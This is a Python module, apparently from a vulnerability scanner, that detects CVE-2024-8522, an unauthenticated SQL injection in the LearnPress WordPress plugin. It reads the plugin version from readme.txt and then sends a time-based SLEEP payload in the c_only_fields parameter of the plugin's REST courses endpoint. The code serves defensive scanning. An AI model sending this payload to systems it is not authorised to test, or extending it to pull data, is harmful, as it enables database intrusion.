"""Agent Asteroid implementation for CVE-2024-8522"""

import re
import logging
import requests
from urllib import parse as urlparse

from requests import exceptions as requests_exceptions
from ostorlab.agent.kb import kb
from ostorlab.agent.mixins import agent_report_vulnerability_mixin

from agent import definitions
from agent import exploits_registry

VULNERABLE_VERSIONS = [
    r"([0-3](\.\d+){0,3})",  # Matches versions from 0.x to 3.x.x.x
    r"4\.[0-1](\.\d+){0,2}",  # Matches versions from 4.0.x to 4.1.x.x
    r"4\.2\.([0-6](\.\d+){0,1})",  # Matches versions from 4.2.0 to 4.2.6.x
    r"4\.2\.7",  # Matches exactly 4.2.7
]

VULNERABILITY_TITLE = "Unauthenticated SQL Injection Vulnerability in LearnPress Plugin"
VULNERABILITY_REFERENCE = "CVE-2024-8522"
VULNERABILITY_DESCRIPTION = (
    "The LearnPress plugin for WordPress is vulnerable to SQL Injection in versions up to and including 4.2.7, "
    "allowing unauthenticated attackers to execute arbitrary SQL commands on the database."
)
RISK_RATING = "HIGH"
PAYLOAD = (
    "c_only_fields=(SELECT(0)FROM(SELECT(SLEEP(10)))a)"  # Time-based payload for MySQL
)


def _create_vulnerability(target: definitions.Target) -> definitions.Vulnerability:
    """Creates a vulnerability entry for LearnPress SQL Injection.

    Args:
        target: The URI of the vulnerable target.

    Returns:
        A vulnerability object.
    """
    entry = kb.Entry(
        title=VULNERABILITY_TITLE,
        risk_rating=RISK_RATING,
        short_description=VULNERABILITY_DESCRIPTION,
        description=VULNERABILITY_DESCRIPTION,
        references={
            "nvd.nist.gov": f"https://nvd.nist.gov/vuln/detail/{VULNERABILITY_REFERENCE}",
        },
        recommendation=(
            "- Ensure that the LearnPress plugin is updated to the latest version.\n"
            "- Apply any available security patches from the software vendor."
        ),
        security_issue=True,
        privacy_issue=True,
        has_public_exploit=False,
        targeted_by_malware=False,
        targeted_by_ransomware=False,
        targeted_by_nation_state=False,
    )
    technical_detail = (
        f"{target} is vulnerable to {VULNERABILITY_REFERENCE}, "
        f"{VULNERABILITY_TITLE}"
    )
    vulnerability = definitions.Vulnerability(
        entry=entry,
        technical_detail=technical_detail,
        risk_rating=agent_report_vulnerability_mixin.RiskRating.CRITICAL,
    )
    return vulnerability


@exploits_registry.register
class LearnPressSQLInjectionExploit(definitions.Exploit):
    accept_request = definitions.Request(
        method="GET", path="/wp-content/plugins/learnpress/readme.txt"
    )
    check_request = definitions.Request(
        method="GET", path="/wp-json/learnpress/v1/courses"
    )

    match_pattern = [re.compile("learnpress")]
    accept_pattern = [
        re.compile(f"Stable tag: {version}") for version in VULNERABLE_VERSIONS
    ]

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )

    def accept(self, target: definitions.Target) -> bool:
        """Checks if the target is running a vulnerable version of LearnPress plugin.

        Args:
            target: The target to check.

        Returns:
            True if the target is running a vulnerable version, else False.
        """
        try:
            version_resp = requests.get(
                urlparse.urljoin(
                    target.origin, "/wp-content/plugins/learnpress/readme.txt"
                ),
                timeout=10,
            )
            version_text = version_resp.text

            if any(re.search(pattern, version_text) for pattern in self.accept_pattern):
                return True
            return False
        except requests_exceptions.RequestException as e:
            logging.error("Error fetching LearnPress version: %s", e)
            return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """Tests for SQL Injection in the LearnPress Plugin.

        Args:
            target: The target to test.

        Returns:
            A list of vulnerabilities found, if any.
        """
        try:
            sqli_url = urlparse.urljoin(
                target.origin, f"/wp-json/learnpress/v1/courses?{PAYLOAD}"
            )

            sqli_resp = requests.get(sqli_url, timeout=30)

            if sqli_resp.elapsed.total_seconds() > 10:
                return [_create_vulnerability(target)]
        except requests_exceptions.RequestException as e:
            logging.error("Error during SQL injection test: %s", e)
            return []

        return []
